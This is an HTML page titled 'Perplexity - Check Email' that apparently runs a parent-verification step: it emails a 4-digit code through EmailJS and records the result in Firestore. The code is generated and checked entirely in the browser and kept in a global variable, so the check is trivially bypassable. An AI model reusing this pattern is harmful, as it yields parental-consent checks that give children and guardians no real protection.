<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perplexity - Check Email</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --primary-bg: #fdfdfc; --text-main: #1a1a1a; --text-sub: #6f6f6f; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--primary-bg); margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; color: var(--text-main); }
        .container { width: 100%; max-width: 450px; padding: 40px 20px; text-align: center; position: relative; }
        .close-btn { position: absolute; top: 20px; right: 20px; background: #eee; border: none; border-radius: 50%; width: 32px; height: 32px; cursor: pointer; font-size: 18px; }
        .icon-circle { width: 100px; height: 100px; border: 2px solid #e0e0e0; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 40px auto 30px; position: relative; }
        .icon-circle svg { width: 40px; height: 40px; transform: rotate(-10deg); color: #333; }
        h1 { font-family: 'Times New Roman', Times, serif; font-size: 42px; font-weight: 500; margin: 0 0 15px; }
        .subtext { color: var(--text-sub); font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
        .otp-input { width: 50px; height: 65px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 24px; text-align: center; background: white; }
        .otp-input:focus { border-color: #000; outline: none; }
        .confirm-btn { width: 100%; padding: 16px; background: #acacac; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        .confirm-btn.active { background: #202124; cursor: pointer; }
        .email-input-box { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; font-size: 16px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <button class="close-btn" onclick="window.history.back()">×</button>
    
    <div class="icon-circle">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 10l9 1.5M3 10l19-7-7 19-3-8.5M3 10l3-2"></path></svg>
    </div>

    <!-- Step 1: Ask for Parent Email -->
    <div id="email-step">
        <h1>Parent Verification</h1>
        <p class="subtext">Enter your parent's email to continue. We'll send a sign-in link.</p>
        <input type="email" id="parentEmail" class="email-input-box" placeholder="parent@email.com">
        <button id="sendBtn" class="confirm-btn active">Send Link</button>
    </div>

    <!-- Step 2: Show OTP boxes (from image) -->
    <div id="otp-step" class="hidden">
        <h1>Check your email</h1>
        <p class="subtext">A temporary sign-in link has been sent to <br><b id="displayEmail"></b></p>
        
        <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1">
            <input type="text" class="otp-input" maxlength="1">
            <input type="text" class="otp-input" maxlength="1">
            <input type="text" class="otp-input" maxlength="1">
        </div>
        
        <button id="confirmBtn" class="confirm-btn">Confirm</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    // --- CONFIGURATION ---
    const firebaseConfig = { 
        projectId: "question-metabase",
        // ADD YOUR OTHER FIREBASE KEYS HERE
    };
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    emailjs.init("Yr9MutUoHOEONnFgn");

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');
    const magicCode = urlParams.get('code');
    const magicEmail = urlParams.get('pEmail'); // Passed via link

    // Logic for Magic Link
    async function checkMagicLink() {
        if (sessionId && magicCode) {
            const docRef = doc(db, "ASPX Keys", sessionId);
            const docSnap = await getDoc(docRef);
            if (docSnap.exists() && docSnap.data().temp_otp === magicCode) {
                await finalizeProcess(magicEmail || "Link User");
            }
        }
    }

    async function init() {
        await checkMagicLink(); // Run magic link check first

        if (!sessionId) return;
        const docRef = doc(db, "ASPX Keys", sessionId);
        const docSnap = await getDoc(docRef);

        if (docSnap.exists()) {
            const data = docSnap.data();
            if (data.family === "no" || data.family === "busniess") {
                window.location.href = "6.html";
            }
        }
    }

    // --- OTP UI Logic ---
    const inputs = document.querySelectorAll('.otp-input');
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
            checkOtpStatus();
        });
    });

    function checkOtpStatus() {
        const fullCode = Array.from(inputs).map(i => i.value).join('');
        const btn = document.getElementById('confirmBtn');
        if (fullCode.length === 4) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    }

    // --- Sending Process ---
    document.getElementById('sendBtn').onclick = async () => {
        const pEmail = document.getElementById('parentEmail').value;
        if (!pEmail.includes('@')) return alert("Enter valid email");

        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        
        // Store OTP temporarily in Firestore so magic link can verify it
        await updateDoc(doc(db, "ASPX Keys", sessionId), { temp_otp: otp });

        const params = {
            email: pEmail,
            session: sessionId,
            otp: otp
        };

        emailjs.send('service_1ij08zn', 'template_qxz1wka', params).then(() => {
            document.getElementById('email-step').classList.add('hidden');
            document.getElementById('otp-step').classList.remove('hidden');
            document.getElementById('displayEmail').innerText = pEmail;
            window.currentOtp = otp;
            window.parentEmail = pEmail;
        }).catch(err => alert("Email Error"));
    };

    document.getElementById('confirmBtn').onclick = async () => {
        const entered = Array.from(inputs).map(i => i.value).join('');
        if (entered === window.currentOtp) {
            await finalizeProcess(window.parentEmail);
        } else {
            alert("Wrong code");
        }
    };

    async function finalizeProcess(guardianEmail) {
        const docRef = doc(db, "ASPX Keys", sessionId);
        await updateDoc(docRef, {
            family: "commited",
            guardians: guardianEmail,
            temp_otp: "" // Clear temp otp
        });
        window.location.href = "6.html";
    }

    init();
</script>
</body>
</html>
